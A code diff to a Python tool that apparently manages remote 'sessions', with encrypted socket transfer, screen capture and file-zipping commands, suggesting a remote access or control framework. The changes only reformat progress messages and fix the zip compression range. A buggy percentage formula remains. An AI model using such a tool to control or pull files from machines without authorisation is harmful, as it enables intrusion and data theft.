@@ -291,7 +291,7 @@ class Connection:
             connection.recv(self.PACKET_SIZE)
             for packet_number in range(total_packets):
                 connection.sendall(data[packet_number*self.PACKET_SIZE:(packet_number + 1) * self.PACKET_SIZE])
-                sys.stdout.write(f"\r[*] sending {self.format_byte_length(len_data_total)} to {packet_number + 1 / (total_packets / 100)}% complete")
+                sys.stdout.write(f"\r[*] sending {self.format_byte_length(len_data_total)} ({packet_number + 1 / (total_packets / 100)}% complete)")
                 sys.stdout.flush()
                 print()
         except socket.error as error:
@@ -305,7 +305,7 @@ class Connection:
             connection.send("READY".encode("utf8"))
             for _ in range(math.ceil(header / self.PACKET_SIZE)):
                 data.extend(connection.recv(self.PACKET_SIZE))
-                sys.stdout.write(f"\r[*] receiving {self.format_byte_length(header)} to {round(len(data) / (header / 100), 1)}% complete")
+                sys.stdout.write(f"\r[*] receiving {self.format_byte_length(header)} ({round(len(data) / (header / 100), 1)}% complete)")
                 sys.stdout.flush()
                 print()
             received_dict = json.loads(self.decrypt(bytes(data)).decode(self.CODEC))
@@ -384,8 +384,7 @@ class UserInterface(cmd2.Cmd):
     screen_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
 
     zip_parser = argparse.ArgumentParser(prog="zip")
-    zip_parser.add_argument("-c", "--compression", default=1, type=int, help="zip compression level",
-                            choices=range(0, 9))
+    zip_parser.add_argument("-c", "--compression", default=1, type=int, help="zip compression level", choices=range(10))
     zip_parser.add_argument("-r", "--read", required=True, type=str, help="file or folder to read")
     zip_parser.add_argument("-w", "--write", required=True, type=str, help="file to write the zipfile in")
     zip_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
